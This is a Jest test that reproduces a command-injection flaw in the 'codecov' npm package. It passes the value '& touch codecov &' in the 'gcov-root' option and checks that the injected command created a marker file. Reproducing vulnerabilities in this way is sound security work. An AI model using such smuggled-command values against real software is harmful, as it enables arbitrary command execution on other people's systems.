process.on("unhandledRejection", () => {});
test("Command Injection in codecov", async () => {
  expect.assertions(2);
  const root = require("codecov");
  const fs = require("fs");
  const path = "./codecov";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let args = {
    options: {
      "gcov-root": "& touch codecov &",
      "gcov-exec": " ",
      "gcov-args": " ",
    },
  };
  try {
    await root.handleInput.upload(
      args,
      function () {
        console.log("success");
      },
      function () {
        console.log("Fail!");
      }
    );
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
